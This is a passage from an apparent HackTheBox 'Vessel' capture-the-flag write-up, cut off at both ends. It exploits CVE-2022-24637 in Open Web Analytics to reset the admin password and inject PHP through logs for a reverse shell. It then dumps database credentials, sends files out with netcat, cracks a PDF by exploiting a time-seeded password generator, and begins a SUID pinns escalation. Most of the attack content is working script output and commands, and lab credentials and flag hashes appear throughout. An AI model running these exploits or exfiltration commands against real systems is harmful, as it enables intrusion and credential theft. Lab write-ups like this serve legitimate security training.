roperties\";a:4:{s:5:\"alias\";s:4:\"user\";s:4:\"name\";s:8:\"owa_user\";s:9:\"cacheable\";b:1;s:23:\"cache_expiration_period\";i:604800;}s:12:\"wasPersisted\";b:1;s:5:\"cache\";N;}% \nAs stated in the blog post, it’s the temp_passkey cc25c639f4395109e0381784b7ec840e that can be userd to set a new password for the admin account.\n\n\nStep 3\nKeep building on the script with the blog post as reference and I’m easily able to decode the base64 blob, capture the temp_passkey value and change the password for user admin.\n➜  vessel python3 vessel.py -t http://openwebanalytics.vessel.htb -u admin -p exploit.se\n[+] generationg cache file\n[+] admin cache found!\n[+] extracted temp_passkey: 30e22a1a269d2a65534054bda6ea971b\n[+] changed admin password to: exploit.se\n[+] admin login successful\nWe’re now able to login to the service using admin:exploit.se and within we find the directory path:\n\nTesting to update a value from “On” to “Off” we se all variables used in the POST request:\nPOST /index.php?owa_do=base.optionsGeneral HTTP/1.1\nHost: openwebanalytics.vessel.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 772\nOrigin: http://openwebanalytics.vessel.htb\nConnection: close\nReferer: http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral\nCookie: owa_passwordSession=c825d3ad67e8ba16dc4f57ddd662a2d296801b6e67017ad76e85350e1ed5ff62; owa_userSession=admin; owa_userSession=admin; owa_passwordSession=49639afc7e742a04d65be47b4eb2ddc2cf0ecb181eddd4151f37e117e280c750\nUpgrade-Insecure-Requests: 1\n\nowa_config%5Bbase.resolve_hosts%5D=0&owa_config%5Bbase.log_feedreaders%5D=1&owa_config%5Bbase.log_robots%5D=0&owa_config%5Bbase.log_named_users%5D=1&owa_config%5Bbase.excluded_ips%5D=%2C&owa_config%5Bbase.anonymize_ips%5D=0&owa_config%5Bbase.fetch_refering_page_info%5D=1&owa_config%5Bbase.p3p_policy%5D=NOI+ADM+DEV+PSAi+COM+NAV+OUR+OTRo+STP+IND+DEM&owa_config%5Bbase.query_string_filters%5D=%2C&owa_config%5Bbase.announce_visitors%5D=0&owa_config%5Bbase.notice_email%5D=admin%40vessel.htb&owa_config%5Bbase.geolocation_lookup%5D=1&owa_config%5Bbase.track_feed_links%5D=1&owa_config%5Bbase.async_log_dir%5D=%2Fvar%2Fwww%2Fhtml%2Fowa%2Fowa-data%2Flogs%2F&owa_config%5Bbase.timezone%5D=America%2FLos_Angeles&owa_nonce=ac9b9a2272&owa_action=base.optionsUpdate&owa_module=base\nTo update the log settings we need to figure out how to dynamically get the owa_nonce value and path to log directory. Luckily this is just as easy as doing a GET request:\ndef updateLog(target):\n    # Update log to prepare for malicious payload\n    url = target + \"/index.php?owa_do=base.optionsGeneral\"\n    get_data = r.get(url).text\n    nonce = re.search(r'\\\"owa_nonce\\\" value\\=\\\"(.*?)\\\"\\&gt;', get_data).group(1)\n    log_dir = re.search(r'\\\"owa_config\\[base.async_log_dir\\]\\\" value\\=\\\"(.*?)\\\"\\&gt;', get_data).group(1) \n    print(\"[+] extracted nonce:\", nonce)\n    print(\"[+] extracted log_dir:\", log_dir)\n➜  vessel python3 vessel.py -t http://openwebanalytics.vessel.htb -u admin -p asdf123\n[... snip ...]\n[+] extracted nonce: ac9b9a2272\n[+] extracted log_dir: /var/www/html/owa/owa-data/logs/\n\n\nStep 4\nWe can now change the log level and log file to .php, to and from here be able to do a log injection to execute php code and get a reverse shell.\nThe log injection is executed through the User Agent as we controll this variable and can easily verify that it’s reflected:\n➜  vessel curl http://openwebanalytics.vessel.htb/owa-data/logs/rev.php\n[... snip ...]\n[debug_log] Request URL:GET / 06:08:36 2022-08-30 3856 \n[debug_log] User Agent: ASDF THIS IS A TEST AGENT 06:08:36 2022-08-30 3856 \n[debug_log] Host: openwebanalytics.vessel.htb 06:08:36 2022-08-30 3856\n➜  vessel python3 cve-2022-24637.py -t http://openwebanalytics.vessel.htb -u admin -p exploit.se\n\n   ______     _______     ____   ___ ____  ____      ____  _  _    __  __________ \n  / ___\\ \\   / / ____|   |___ \\ / _ \\___ \\|___ \\    |___ \\| || |  / /_|___ /___  |\n | |    \\ \\ / /|  _| _____ __) | | | |__) | __) |____ __) | || |_| '_ \\ |_ \\  / / \n | |___  \\ V / | |__|_____/ __/| |_| / __/ / __/_____/ __/|__   _| (_) |__) |/ /  \n  \\____|  \\_/  |_____|   |_____|\\___/_____|_____|   |_____|  |_|  \\___/____//_/   \n                            by 0xPThree - exploit.se\n\n\n[&gt;] PART 1: SINGLE / DOUBLE QUOTE CONFUSION\n[+] generationg cache file\n[+] admin cache found!\n[+] extracted temp_passkey: 19f5058761ee001e3addb0d3ad400da8\n[+] changed admin password to: exploit.se\n[+] admin login successful\n\n[&gt;] PART 2: PHP FILE WRITE\n[+] extracted nonce: 6d6ed4fecf\n[+] extracted log_dir: /var/www/html/owa/owa-data/logs/\n[+] updated log settings\n[+] wrote payload to file: http://openwebanalytics.vessel.htb/owa-data/logs/rev.php\n[&gt;] triggering payload\n\n\n➜  vessel nc -lvnp 4488                                                              \nlistening on [any] 4488 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.11.178] 49452\nbash: cannot set terminal process group (1005): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@vessel:/var/www/html/owa/owa-data/logs$ id && hostname\nid && hostname\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nvessel\nDownload my CVE-2022-24637 script HERE.\nNOTE: The script won’t take into account if the php cache file already exists, if that’s the case it will print “admin login successful” at the start even though it isnt. I’m to lazy to fix this, even though it’s solved with a simple if-statement.\n\n\n\nStep 5\nEnumerate the box manually and we find..\n.. mysql credentials and data:\nwww-data@vessel:/$ cat /var/www/html/owa/owa-config.php\n[... snip ...]\ndefine('OWA_DB_TYPE', 'mysql'); // options: mysql\ndefine('OWA_DB_NAME', 'owa'); // name of the database\ndefine('OWA_DB_HOST', 'localhost'); // host name of the server housing the database\ndefine('OWA_DB_USER', 'owauser'); // database user\ndefine('OWA_DB_PORT', '3306'); // port of database\ndefine('OWA_DB_PASSWORD', 'Vux8*ZF3rek94%NW'); // database users password\n\n\nwww-data@vessel:/var/www/html/vessel/vessel/config$ cat db.js\nvar connection = {\n    db: {\n    host     : 'localhost',\n    user     : 'default',\n    password : 'daqvACHKvRn84VdVp',\n    database : 'vessel'\n    \n\nwww-data@vessel:/var/www/html/owa/owa-data/logs$ netstat -tulpn\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name            \ntcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -       \n\n\nwww-data@vessel:/var/www/html/owa/owa-data/logs$ mysql owa -u owauser -p\nEnter password: Vux8*ZF3rek94%NW\nmysql&gt; use owa;\nmysql&gt; select * from owa_user;\n+----+---------+--------------------------------------------------------------+-------+---------------+------------------+----------------------------------+---------------+------------------+----------------------------------+\n| id | user_id | password                                                     | role  | real_name     | email_address    | temp_passkey                     | creation_date | last_update_date | api_key                          |\n+----+---------+--------------------------------------------------------------+-------+---------------+------------------+----------------------------------+---------------+------------------+----------------------------------+\n|  1 | admin   | $2y$10$40VVeZjtIFp7QY9FByW.y.wkTFkcEcOEmEPjpVbGbdxMIUbfKzc96 | admin | default admin | admin@vessel.htb | a48f104f6f995e9655fe771a039666ad |    1650211659 |       1650211659 | a390cc0247ecada9a2b8d2338b9ca6d2 |\n+----+---------+--------------------------------------------------------------+-------+---------------+------------------+----------------------------------+---------------+------------------+----------------------------------+\n\n\nwww-data@vessel:/var/www/html/owa/owa-data/logs$ mysql -D vessel -u default -p\nEnter password: daqvACHKvRn84VdVp\nmysql&gt; use vessel;\nmysql&gt; select * from accounts;\n+----+----------+----------------------------------+------------------+\n| id | username | password                         | email            |\n+----+----------+----------------------------------+------------------+\n|  1 | admin    | k&gt;N4Hf6TmHE(W]Uq\"(RCj}V&gt;&=rB$4}&lt; | admin@vessel.htb |\n+----+----------+----------------------------------+------------------+\n.. read/execute privileges in user steven’s home directory:\nwww-data@vessel:/home$ ls -al\nls -al\ntotal 16\ndrwxr-xr-x  4 root   root   4096 Aug 11 14:43 .\ndrwxr-xr-x 19 root   root   4096 Aug 11 14:43 ..\ndrwx------  5 ethan  ethan  4096 Aug 11 14:43 ethan\ndrwxrwxr-x  3 steven steven 4096 Aug 11 14:43 steven\n\nwww-data@vessel:/home$ ls -al steven    \ntotal 33796\ndrwxrwxr-x 3 steven steven     4096 Aug 11 14:43 .\ndrwxr-xr-x 4 root   root       4096 Aug 11 14:43 ..\nlrwxrwxrwx 1 root   root          9 Apr 18 14:45 .bash_history -&gt; /dev/null\n-rw------- 1 steven steven      220 Apr 17 18:38 .bash_logout\n-rw------- 1 steven steven     3771 Apr 17 18:38 .bashrc\ndrwxr-xr-x 2 ethan  steven     4096 Aug 11 14:43 .notes\n-rw------- 1 steven steven      807 Apr 17 18:38 .profile\n-rw-r--r-- 1 ethan  steven 34578147 May  4 11:03 passwordGenerator\n\nwww-data@vessel:/home/steven$ file passwordGenerator\npasswordGenerator: PE32 executable (console) Intel 80386, for MS Windows\n.. two files in the .notes directory. Download and analyze them:\nwww-data@vessel:/home/steven/.notes$ ls -al\nls -al\ntotal 40\ndrwxr-xr-x 2 ethan  steven  4096 Aug 11 14:43 .\ndrwxrwxr-x 3 steven steven  4096 Aug 11 14:43 ..\n-rw-r--r-- 1 ethan  steven 17567 Aug 10 18:42 notes.pdf\n-rw-r--r-- 1 ethan  steven 11864 May  2 21:36 screenshot.png\nwww-data@vessel:/home/steven/.notes$ nc -w3 10.10.14.2 1234 &lt; notes.pdf\nnc -w3 10.10.14.2 1234 &lt; notes.pdf\nwww-data@vessel:/home/steven/.notes$ nc -w3 10.10.14.2 1234 &lt; screenshot.png\nnc -w3 10.10.14.2 1234 &lt; screenshot.png\nscreenshot.png:\n\nnotes.pdf:\n\nNone of the three found passwords unlocks the file, and we are unable to crack the PDF using pdf2john and john.\n➜  vessel cat password.txt \nVux8*ZF3rek94%NW\ndaqvACHKvRn84VdVp\nk&gt;N4Hf6TmHE(W]Uq\"(RCj}V&gt;&=rB$4}&lt;\nNor does any of the passwords work to escalate privileges using su and/or ssh. With screenshot.png pointing towards the passwordGenerator we probably need to dig deeper here, maybe calculated passwords are stored within, passwords are generated in the same order or they are generated with a constant value making the seeming “random” password only having x amount of possible iteration.\nLooking on the file with strings we can see that it was compiled using PyInstaller:\n➜  vessel strings passwordGenerator| grep -i pyins\nCannot open PyInstaller archive from executable (%s) or external archive (%s)\nPyInstaller: FormatMessageW failed.\nPyInstaller: pyi_win32_utils_to_utf8 failed.\n“PyInstaller reads a Python script written by you. It analyzes your code to discover every other module and library your script needs in order to execute. Then it collects copies of all those files – including the active Python interpreter! – and puts them with your script in a single folder, or optionally in a single executable file.”\nLuckily for us, these files can be extracted using pyinstxtractor. Download pyinstxtractor to your Windows VM and extract the files from passwordGenerator.\nPS C:\\tools\\pyinstxtractor&gt; python .\\pyinstxtractor.py C:\\Users\\pwn10\\Documents\\htb\\vessel\\passwordGenerator\n[+] Processing C:\\Users\\pwn10\\Documents\\htb\\vessel\\passwordGenerator\n[+] Pyinstaller version: 2.1+\n[+] Python version: 3.7\n[+] Length of package: 34300131 bytes\n[+] Found 95 files in CArchive\n[+] Beginning extraction...please standby\n[+] Possible entry point: pyiboot01_bootstrap.pyc\n[+] Possible entry point: pyi_rth_subprocess.pyc\n[+] Possible entry point: pyi_rth_pkgutil.pyc\n[+] Possible entry point: pyi_rth_inspect.pyc\n[+] Possible entry point: pyi_rth_pyside2.pyc\n[+] Possible entry point: passwordGenerator.pyc\n[!] Warning: This script is running in a different Python version than the one used to build the executable.\n[!] Please run this script in Python 3.7 to prevent extraction errors during unmarshalling\n[!] Skipping pyz extraction\n[+] Successfully extracted pyinstaller archive: C:\\Users\\pwn10\\Documents\\htb\\vessel\\passwordGenerator\n\nYou can now use a python decompiler on the pyc files within the extracted directory\nNotice the python version 3.7, I’m running 3.10 making the output not accurate. Download and install python 3.7 and try again.\nPS C:\\tools\\pyinstxtractor&gt; python3.7.exe pyinstxtractor.py C:\\Users\\pwn10\\Documents\\htb\\vessel\\passwordGenerator       [+] Processing C:\\Users\\pwn10\\Documents\\htb\\vessel\\passwordGenerator\n[+] Pyinstaller version: 2.1+\n[+] Python version: 3.7\n[+] Length of package: 34300131 bytes\n[+] Found 95 files in CArchive\n[+] Beginning extraction...please standby\n[+] Possible entry point: pyiboot01_bootstrap.pyc\n[+] Possible entry point: pyi_rth_subprocess.pyc\n[+] Possible entry point: pyi_rth_pkgutil.pyc\n[+] Possible entry point: pyi_rth_inspect.pyc\n[+] Possible entry point: pyi_rth_pyside2.pyc\n[+] Possible entry point: passwordGenerator.pyc\n[+] Found 142 files in PYZ archive\n[+] Successfully extracted pyinstaller archive: C:\\Users\\pwn10\\Documents\\htb\\vessel\\passwordGenerator\n\nYou can now use a python decompiler on the pyc files within the extracted directory\nAs stated on pyinstxtractor’s git, we now need to decompile the .pyc files, something we can do using uncompyle6 or decompyle3.\nPS C:\\&gt; pip3 install uncompyle6\nCollecting uncompyle6\n  Using cached uncompyle6-3.8.0-py310-none-any.whl (317 kB)\nRequirement already satisfied: spark-parser&lt;1.9.0,&gt;=1.8.9 in c:\\python310\\lib\\site-packages (from uncompyle6) (1.8.9)\nRequirement already satisfied: xdis&lt;6.1.0,&gt;=6.0.2 in c:\\python310\\lib\\site-packages (from uncompyle6) (6.0.4)\nRequirement already satisfied: click in c:\\python310\\lib\\site-packages (from spark-parser&lt;1.9.0,&gt;=1.8.9-&gt;uncompyle6) (8.1.3)\nRequirement already satisfied: six&gt;=1.10.0 in c:\\python310\\lib\\site-packages (from xdis&lt;6.1.0,&gt;=6.0.2-&gt;uncompyle6) (1.16.0)\nRequirement already satisfied: colorama in c:\\python310\\lib\\site-packages (from click-&gt;spark-parser&lt;1.9.0,&gt;=1.8.9-&gt;uncompyle6) (0.4.5)\nInstalling collected packages: uncompyle6\nSuccessfully installed uncompyle6-3.8.0\n\nPS C:\\tools\\pyinstxtractor\\passwordGenerator_extracted&gt; uncompyle6 passwordGenerator.pyc &gt; passwordGenerator.py\nPS C:\\tools\\pyinstxtractor\\passwordGenerator_extracted&gt; cat passwordGenerator.py\n# uncompyle6 version 3.8.0\n# Python bytecode 3.7.0 (3394)\n# Decompiled from: Python 3.10.1 (tags/v3.10.1:2cd268a, Dec  6 2021, 19:10:37) [MSC v.1929 64 bit (AMD64)]\n# Embedded file name: passwordGenerator.py\nfrom PySide2.QtCore import *\nfrom PySide2.QtGui import *\nfrom PySide2.QtWidgets import *\nfrom PySide2 import QtWidgets\nimport pyperclip\n\nclass Ui_MainWindow(object):\n\n    def setupUi(self, MainWindow):\n        if not MainWindow.objectName():\n            MainWindow.setObjectName('MainWindow')\n        MainWindow.resize(560, 408)\n        self.centralwidget = QWidget(MainWindow)\n        self.centralwidget.setObjectName('centralwidget')\n        self.title = QTextBrowser(self.centralwidget)\n        self.title.setObjectName('title')\n        self.title.setGeometry(QRect(80, 10, 411, 51))\n        self.textBrowser_2 = QTextBrowser(self.centralwidget)\n        self.textBrowser_2.setObjectName('textBrowser_2')\n        self.textBrowser_2.setGeometry(QRect(10, 80, 161, 41))\n        self.generate = QPushButton(self.centralwidget)\n        self.generate.setObjectName('generate')\n        self.generate.setGeometry(QRect(140, 330, 261, 51))\n        self.PasswordLength = QSpinBox(self.centralwidget)\n        self.PasswordLength.setObjectName('PasswordLength')\n        self.PasswordLength.setGeometry(QRect(30, 130, 101, 21))\n        self.PasswordLength.setMinimum(10)\n        self.PasswordLength.setMaximum(40)\n        self.copyButton = QPushButton(self.centralwidget)\n        self.copyButton.setObjectName('copyButton')\n        self.copyButton.setGeometry(QRect(460, 260, 71, 61))\n        self.textBrowser_4 = QTextBrowser(self.centralwidget)\n        self.textBrowser_4.setObjectName('textBrowser_4')\n        self.textBrowser_4.setGeometry(QRect(190, 170, 141, 41))\n        self.checkBox = QCheckBox(self.centralwidget)\n        self.checkBox.setObjectName('checkBox')\n        self.checkBox.setGeometry(QRect(250, 220, 16, 17))\n        self.checkBox.setCheckable(True)\n        self.checkBox.setChecked(False)\n        self.checkBox.setTristate(False)\n        self.comboBox = QComboBox(self.centralwidget)\n        self.comboBox.addItem('')\n        self.comboBox.addItem('')\n        self.comboBox.addItem('')\n        self.comboBox.setObjectName('comboBox')\n        self.comboBox.setGeometry(QRect(350, 130, 161, 21))\n        self.textBrowser_5 = QTextBrowser(self.centralwidget)\n        self.textBrowser_5.setObjectName('textBrowser_5')\n        self.textBrowser_5.setGeometry(QRect(360, 80, 131, 41))\n        self.password_field = QLineEdit(self.centralwidget)\n        self.password_field.setObjectName('password_field')\n        self.password_field.setGeometry(QRect(100, 260, 351, 61))\n        MainWindow.setCentralWidget(self.centralwidget)\n        self.statusbar = QStatusBar(MainWindow)\n        self.statusbar.setObjectName('statusbar')\n        MainWindow.setStatusBar(self.statusbar)\n        self.retranslateUi(MainWindow)\n        QMetaObject.connectSlotsByName(MainWindow)\n\n    def retranslateUi(self, MainWindow):\n        MainWindow.setWindowTitle(QCoreApplication.translate('MainWindow', 'MainWindow', None))\n        self.title.setDocumentTitle('')\n        self.title.setHtml(QCoreApplication.translate('MainWindow', '&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\"&gt;\\n&lt;html&gt;&lt;head&gt;&lt;meta name=\"qrichtext\" content=\"1\" /&gt;&lt;style type=\"text/css\"&gt;\\np, li { white-space: pre-wrap; }\\n&lt;/style&gt;&lt;/head&gt;&lt;body style=\" font-family:\\'MS Shell Dlg 2\\'; font-size:8.25pt; font-weight:400; font-style:normal;\"&gt;\\n&lt;p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"&gt;&lt;span style=\" font-size:20pt;\"&gt;Secure Password Generator&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;', None))\n        self.textBrowser_2.setDocumentTitle('')\n        self.textBrowser_2.setHtml(QCoreApplication.translate('MainWindow', '&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\"&gt;\\n&lt;html&gt;&lt;head&gt;&lt;meta name=\"qrichtext\" content=\"1\" /&gt;&lt;style type=\"text/css\"&gt;\\np, li { white-space: pre-wrap; }\\n&lt;/style&gt;&lt;/head&gt;&lt;body style=\" font-family:\\'MS Shell Dlg 2\\'; font-size:8.25pt; font-weight:400; font-style:normal;\"&gt;\\n&lt;p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"&gt;&lt;span style=\" font-size:14pt;\"&gt;Password Length&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;', None))\n        self.generate.setText(QCoreApplication.translate('MainWindow', 'Generate!', None))\n        self.copyButton.setText(QCoreApplication.translate('MainWindow', 'Copy', None))\n        self.textBrowser_4.setDocumentTitle('')\n        self.textBrowser_4.setHtml(QCoreApplication.translate('MainWindow', '&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\"&gt;\\n&lt;html&gt;&lt;head&gt;&lt;meta name=\"qrichtext\" content=\"1\" /&gt;&lt;style type=\"text/css\"&gt;\\np, li { white-space: pre-wrap; }\\n&lt;/style&gt;&lt;/head&gt;&lt;body style=\" font-family:\\'MS Shell Dlg 2\\'; font-size:8.25pt; font-weight:400; font-style:normal;\"&gt;\\n&lt;p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"&gt;&lt;span style=\" font-size:14pt;\"&gt;Hide Password&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;', None))\n        self.checkBox.setText('')\n        self.comboBox.setItemText(0, QCoreApplication.translate('MainWindow', 'All Characters', None))\n        self.comboBox.setItemText(1, QCoreApplication.translate('MainWindow', 'Alphabetic', None))\n        self.comboBox.setItemText(2, QCoreApplication.translate('MainWindow', 'Alphanumeric', None))\n        self.textBrowser_5.setDocumentTitle('')\n        self.textBrowser_5.setHtml(QCoreApplication.translate('MainWindow', '&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\"&gt;\\n&lt;html&gt;&lt;head&gt;&lt;meta name=\"qrichtext\" content=\"1\" /&gt;&lt;style type=\"text/css\"&gt;\\np, li { white-space: pre-wrap; }\\n&lt;/style&gt;&lt;/head&gt;&lt;body style=\" font-family:\\'MS Shell Dlg 2\\'; font-size:8.25pt; font-weight:400; font-style:normal;\"&gt;\\n&lt;p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"&gt;&lt;span style=\" font-size:16pt;\"&gt;characters&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;', None))\n        self.password_field.setText('')\n\n\nclass MainWindow(QMainWindow, Ui_MainWindow):\n\n    def __init__(self):\n        super(MainWindow, self).__init__()\n        self.setupUi(self)\n        self.setFixedSize(QSize(550, 400))\n        self.setWindowTitle('Secure Password Generator')\n        self.password_field.setReadOnly(True)\n        self.passlen()\n        self.chars()\n        self.hide()\n        self.gen()\n\n    def passlen(self):\n        self.PasswordLength.valueChanged.connect(self.lenpass)\n\n    def lenpass(self, l):\n        global value\n        value = l\n\n    def chars(self):\n        self.comboBox.currentIndexChanged.connect(self.charss)\n\n    def charss(self, i):\n        global index\n        index = i\n\n    def hide(self):\n        self.checkBox.stateChanged.connect(self.status)\n\n    def status(self, s):\n        global status\n        status = s == Qt.Checked\n\n    def copy(self):\n        self.copyButton.clicked.connect(self.copied)\n\n    def copied(self):\n        pyperclip.copy(self.password_field.text())\n\n    def gen(self):\n        self.generate.clicked.connect(self.genButton)\n\n    def genButton(self):\n        try:\n            hide = status\n            if hide:\n                self.password_field.setEchoMode(QLineEdit.Password)\n            else:\n                self.password_field.setEchoMode(QLineEdit.Normal)\n            password = self.genPassword()\n            self.password_field.setText(password)\n        except:\n            msg = QMessageBox()\n            msg.setWindowTitle('Warning')\n            msg.setText('Change the default values before generating passwords!')\n            x = msg.exec_()\n\n        self.copy()\n\n    def genPassword(self):\n        length = value\n        char = index\n        if char == 0:\n            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;&lt;&gt;,.?'\n        else:\n            if char == 1:\n                charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'\n            else:\n                if char == 2:\n                    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'\n                else:\n                    try:\n                        qsrand(QTime.currentTime().msec())\n                        password = ''\n                        for i in range(length):\n                            idx = qrand() % len(charset)\n                            nchar = charset[idx]\n                            password += str(nchar)\n\n                    except:\n                        msg = QMessageBox()\n                        msg.setWindowTitle('Error')\n                        msg.setText('Error while generating password!, Send a message to the Author!')\n                        x = msg.exec_()\n\n                return password\n\n\nif __name__ == '__main__':\n    app = QtWidgets.QApplication()\n    mainwindow = MainWindow()\n    mainwindow.show()\n    app.exec_()\n# okay decompiling passwordGenerator.pyc\n\n\nStep 6\nAt the bottom of the script we see the function we’re after, genPassword, where they use a simple for-loop and a time-based randomizer for generating passwords:\n qsrand(QTime.currentTime().msec())\n password = ''\n for i in range(length):\n    idx = qrand() % len(charset)\n    nchar = charset[idx]\n    password += str(nchar)\nWe can simply copy the genPassword function, remove all trash as we saw from screenshot.png that the length should be 32 and charset 0 (all characters) is used.\nI was stuck with this script for a few hours, mainly because the product always generate 999 passwords. Debugging with print() and writing output to file I found that the value produced from qrand() isn’t that random at all and re-appear several times, even in the same pattern. Since the seed change every loop, my script would only generate 1 password per seed. Looking on the docs for QTime.msec() we find msec() will return 0 - 999, giving us a maximum of 1000 passwords generated.\nPoC to show qtime() “random” numbers:\n➜  vessel ./genPw.py | tee output.txt \n[... snip ...]\nloop nr. 88434 - generated passwords: 999\nqrand: 31376150\nloop nr. 88435 - generated passwords: 999\nqrand: 31376150\nloop nr. 88436 - generated passwords: 999\nqrand: 31424421\nloop nr. 88437 - generated passwords: 999\nqrand: 31424421\n\n➜  vessel grep -n 31376150 output.txt\n59669:qrand: 31376150\n176871:qrand: 31376150\n\n➜  vessel grep -n 31424421 output.txt\n59671:qrand: 31424421\n176873:qrand: 31424421\nWe could also verify this a bit easier by just writing QTime.currentTime().msec() to a variable and printing the variable.\nWrite a script to loop through 0 - 999 and generate a password based on the “loop number” to generate all possible passwords. Most of the code can just be taken from the original program.\n➜  vessel python3 genPws.py\n[... snip ...]\nloop nr. 998 - generated passwords: 997\nloop nr. 999 - generated passwords: 998\ntime elapsed: 0.02527642250061035 seconds\n\n➜  vessel wc -l pw-list.txt \n999 pw-list.txt\n\n➜  vessel john --wordlist=pw-list.txt notes.hash \nUsing default input encoding: UTF-8\nLoaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])\nCost 1 (revision) is 3 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:00 DONE (2022-09-01 18:53) 0g/s 99900p/s 99900c/s 99900C/s 2J16^&gt;.|vtXpN2[o1H;e4f|FF0([y+|q..l2DoG^icl}&gt;kZ[tNB|:]m5km@{x:^7ck\nSession completed. \n\n➜  vessel john --show notes.hash\n0 password hashes cracked, 1 left\nAlthough everything is correct in theory, we’re not able to generate correct password.. this had me stumped for even more hours where I re-built the script a few times but without any luck. Then I decided to try the script on my Windows VM.\nPS C:\\Users\\void\\Documents\\htb\\vessel&gt; python3.7.exe .\\genPws.py\n[... snip ...]\nloop nr. 998 - generated passwords: 998\nloop nr. 999 - generated passwords: 999\ntime elapsed: 0.14032745361328125 seconds\nDownload my genPws.py script HERE.\nTransfer the password file to Kali attack VM and BOOM! We’re able to crack the PDF. The problem is coming from PySide2 behaving differently depending on OS. Don’t ask me how, or why, this I simply don’t know.\n➜  vessel john --wordlist=pw-list_windows.txt notes.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])\nCost 1 (revision) is 3 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nYG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS (notes.pdf)     \n1g 0:00:00:00 DONE (2022-09-01 19:01) 100.0g/s 38400p/s 38400c/s 38400C/s _jEkA+f0VXtWZ[K.d+EdaBAB&gt;;r]E3Z*..r6TUgox@Tb5JWnK5AHO}$AE%8!d58Shq\nUse the \"--show --format=PDF\" options to display all of the cracked passwords reliably\nSession completed. \n\n➜  vessel john --show notes.hash                        \nnotes.pdf:YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS\n\n1 password hash cracked, 0 left\n\n\nStep 7\nRead the PDF and we find System Administrator ethan’s password - b@mPRNSVTjjLKId1T\n\nLogin with SSH and grab user.txt\n➜  vessel ssh ethan@vessel.htb \nethan@vessel.htb password: b@mPRNSVTjjLKId1T\n\nethan@vessel:~$ id && hostname && cat user.txt \nuid=1000(ethan) gid=1000(ethan) groups=1000(ethan)\nvessel\n608191af90716a518c1483138b0b1ded\n\n\n\n\nROOT\n\nStep 1\nSome quick manual enumeration as user ethan and we find..\n.. we’re unable to run anything as root:\nethan@vessel:~$ sudo -l\n[sudo] password for ethan: \nSorry, user ethan may not run sudo on vessel.\n.. nothing of use in /opt, /tmp or /dev/shm\n.. no unknown service running locally:\nethan@vessel:~$ netstat -tulpn\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                   \ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -   \n.. we are not part of any strange/interesting groups:\nethan@vessel:~$ id\nuid=1000(ethan) gid=1000(ethan) groups=1000(ethan)\n.. interesting objects owned by group ethan:\nethan@vessel:/$ find / -group ethan 2&gt; /dev/null\n/usr/bin/pinns\n\nethan@vessel:/$ ls -al /usr/bin/pinns\n-rwsr-x--- 1 root ethan 814936 Mar 15 18:18 /usr/bin/pinns\n/usr/bin/pinns have the SUID bit set and is most likely our path to root, lets investigate more.\nethan@vessel:/$ /usr/bin/pinns\n[pinns:e]: Path for pinning namespaces not specified: Invalid argument\nethan@vessel:/$ /usr/bin/pinns --help\nethan@vessel:/$ /usr/bin/pinns -h\nGoogling for “Path for pinning namespaces” we get two matches, both referencing CRI-O.\n\n“CRI-O is an implementation of the Kubernetes CRI (Container Runtime Interface) to enable using OCI (Open Container Initiative) compatible runtimes. It is a lightweight alternative to using Docker as the runtime for kubernetes.”\nGoogle cri-o “pinns” and the first article we find is one from CrowdStrike disclosing a vulnerability in CRI-O, CVE-2022-0811. Some key information from the 